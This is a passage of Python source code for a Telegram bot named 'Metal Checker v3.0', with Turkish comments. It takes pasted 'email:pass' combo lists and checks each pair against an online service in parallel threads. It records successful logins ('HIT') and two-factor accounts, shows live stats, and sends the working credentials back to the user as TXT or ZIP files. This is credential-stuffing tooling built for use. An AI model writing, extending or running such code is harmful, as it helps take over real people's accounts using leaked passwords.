        lines = [l.strip() for l in message.text.split('\n') if l.strip() and ':' in l]
        
    if not lines:
        bot.send_message(chat_id, "❌ Combolar bulunamadı. 'email:pass' formatında bir şeyler at.")
        return
        
    user_states[chat_id] = "CHECKING"
    stop_flags[chat_id] = False
    active_tasks[chat_id] = True
    
    config = user_configs[chat_id]
    result_mgr = ResultManager(chat_id, config["mode"])
    stats = LiveStats(len(lines), chat_id, config["mode"])
    
    msg = bot.send_message(chat_id, stats.generate_text(), parse_mode="Markdown")
    stats.message_id = msg.message_id
    
    def process_line(line):
        if stop_flags.get(chat_id, False): return
        try:
            parts = line.split(':', 1)
            if len(parts) != 2: 
                stats.update("BAD")
                return
            checker = UnifiedChecker(api_mode=config["api"], check_mode=config["mode"])
            res = checker.check(parts[0].strip(), parts[1].strip())
            stats.update(res["status"], res if res["status"] == "HIT" else None)
            
            if res["status"] == "HIT": result_mgr.save_hit(res)
            elif res["status"] == "2FA": result_mgr.save_2fa(parts[0].strip(), parts[1].strip())
        except: stats.update("ERROR")

    # Tam olarak 2 saniyede bir ekran güncellemesi
    def ui_updater():
        while active_tasks.get(chat_id, False):
            time.sleep(2.0)
            if not active_tasks.get(chat_id, False): break 
            try: bot.edit_message_text(stats.generate_text(), chat_id, stats.message_id, parse_mode="Markdown")
            except: pass

    updater_thread = Thread(target=ui_updater)
    updater_thread.start()

    with ThreadPoolExecutor(max_workers=config["threads"]) as executor:
        for line in lines:
            if stop_flags.get(chat_id, False): break
            executor.submit(process_line, line)
            
    active_tasks[chat_id] = False
    updater_thread.join()
    
    try: bot.edit_message_text(stats.generate_text() + "\n\n✅ *TARAMA BİTTİ VEYA DURDURULDU!*", chat_id, stats.message_id, parse_mode="Markdown")
    except: pass
    
    bot.send_message(chat_id, "📦 Sonuçlar paketleniyor (Ayarlarına göre TXT veya ZIP)...")
    
    # Teslimat (Full Scan ise ZIP, değilse TXT)
    files_to_send, is_zip = result_mgr.get_delivery_files()
    
    if is_zip and files_to_send:
        with open(files_to_send[0], 'rb') as f:
            bot.send_document(chat_id, f, caption="🔥 *METAL CHECKER - FULL SCAN (.ZIP)*", parse_mode="Markdown")
    elif files_to_send:
        for f_path in files_to_send:
            with open(f_path, 'rb') as f:
                name_clean = os.path.basename(f_path).replace('_', '\\_')
                bot.send_document(chat_id, f, caption=f"🔥 *METAL CHECKER - {name_clean}*", parse_mode="Markdown")
    else:
        bot.send_message(chat_id, "ℹ️ Hiç hit çıkmadı veya kaydedilecek bir dosya oluşmadı.")
        
    try: shutil.rmtree(result_mgr.base_folder)
    except: pass
    if is_zip and files_to_send:
        try: os.remove(files_to_send[0])
        except: pass
    
    user_states[chat_id] = "IDLE"

if __name__ == "__main__":
    print("[DEBUG] Eski oturumlar ve çakışmalar zorla temizleniyor...")
    try:
        # Varsa takılı kalan webhook'ları kaldırır
        bot.remove_webhook()
        time.sleep(1)
    except Exception as e:
        print(f"[DEBUG] Webhook temizleme atlandı: {e}")
        pass
        
    print("[DEBUG] Metal Checker v3.0 Bot Başlatılıyor...")
    
    # skip_pending=True diğer instance'ların yarattığı trafik sıkışıklığını ezer.
    bot.infinity_polling(skip_pending=True, timeout=60, long_polling_timeout=60)

